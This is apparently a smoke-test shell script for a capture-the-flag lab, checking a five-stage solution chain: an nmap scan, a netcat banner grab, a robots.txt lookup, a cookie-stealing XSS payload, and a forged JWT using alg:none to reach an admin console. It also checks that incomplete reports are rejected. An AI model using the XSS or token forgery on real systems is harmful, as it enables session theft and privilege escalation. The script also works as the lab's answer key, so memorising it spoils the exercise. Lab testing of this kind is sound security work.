#!/bin/sh
set -eu

: "${FLAG_L07_RECON_SWEEP:?inject expected flag for smoke test}"
: "${FLAG_L07_SURFACE_MAP:?inject expected flag for smoke test}"
: "${FLAG_L07_WEB_FOOTHOLD:?inject expected flag for smoke test}"
: "${FLAG_L07_PRIV_ESC:?inject expected flag for smoke test}"
: "${FLAG_L07_ROOT_PROOF:?inject expected flag for smoke test}"

assert_contains() {
  haystack=$1
  needle=$2
  printf '%s' "$haystack" | grep -F -- "$needle" >/dev/null || {
    echo "smoke assertion failed: missing $needle" >&2
    exit 1
  }
}

# Stage 1 — recon: confirm the host resolves, exercise the connect scanner,
# and read the raw TCP beacon on 9091.
resolved=$(getent hosts edge-gateway)
assert_contains "$resolved" "172.31.7.20"
nmap -sT -Pn -p 8080,9091 edge-gateway >/dev/null
beacon=$(nc -w 3 edge-gateway 9091 </dev/null)
assert_contains "$beacon" "recon_token=beacon-argon-19"
assert_contains "$beacon" "$FLAG_L07_RECON_SWEEP"

# Stage 2 — surface map: content discovery leads to the dev route.
robots=$(curl -fsS http://edge-gateway:8080/robots.txt)
assert_contains "$robots" "Disallow: /api/dev"
hello=$(curl -fsS http://edge-gateway:8080/api/dev/hello)
assert_contains "$hello" "surface_token=surface-quartz-52"
assert_contains "$hello" "$FLAG_L07_SURFACE_MAP"

# Stage 3: deterministic reviewer simulation returns a synthetic session.
foothold=$(curl -fsS -X POST \
  --data-urlencode 'report=<script>document.cookie</script>' \
  http://edge-gateway:8080/support/ticket)
assert_contains "$foothold" "foothold_token=foothold-cinder-88"
assert_contains "$foothold" "$FLAG_L07_WEB_FOOTHOLD"

# Stage 4 — privilege escalation: preserve the stolen sid in an alg:none token.
stolen=$(printf '%s\n' "$foothold" | sed -n 's/^stolen_cookie=session=//p')
encoded_payload=$(printf '%s' "$stolen" | cut -d. -f2)
case $((${#encoded_payload} % 4)) in
  2) encoded_payload="${encoded_payload}==" ;;
  3) encoded_payload="${encoded_payload}=" ;;
esac
sid=$(printf '%s' "$encoded_payload" | tr '_-' '/+' | base64 -d | jq -r .sid)
header=$(printf '%s' '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=\n' | tr '+/' '-_')
payload=$(printf '{"sub":"analyst","role":"admin","sid":"%s"}' "$sid" | base64 | tr -d '=\n' | tr '+/' '-_')
forged="$header.$payload."
# The original analyst token must not authorize admin access.
test "$(curl -sS -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $stolen" http://ops-internal:8081/admin/console)" = "401"
admin=$(curl -fsS -H "Authorization: Bearer $forged" http://ops-internal:8081/admin/console)
assert_contains "$admin" "admin_token=root-obsidian-77"
assert_contains "$admin" "$FLAG_L07_PRIV_ESC"

# Stage 5 — root proof: chain every recovered token into POST /final.
final=$(curl -fsS -X POST \
  -H "Authorization: Bearer $forged" \
  --data-urlencode 'recon=beacon-argon-19' \
  --data-urlencode 'surface=surface-quartz-52' \
  --data-urlencode 'foothold=foothold-cinder-88' \
  --data-urlencode 'admin=root-obsidian-77' \
  http://ops-internal:8081/final)
assert_contains "$final" "$FLAG_L07_ROOT_PROOF"

# Missing evidence must never release the final proof.
status=$(curl -sS -o /tmp/negative-report-$ -w '%{http_code}' -X POST  'http://ops-internal:8081/final')
test "$status" = "401"
! grep -q 'RLAB{' /tmp/negative-report-$

echo "07 smoke: positive chain and incomplete report passed"
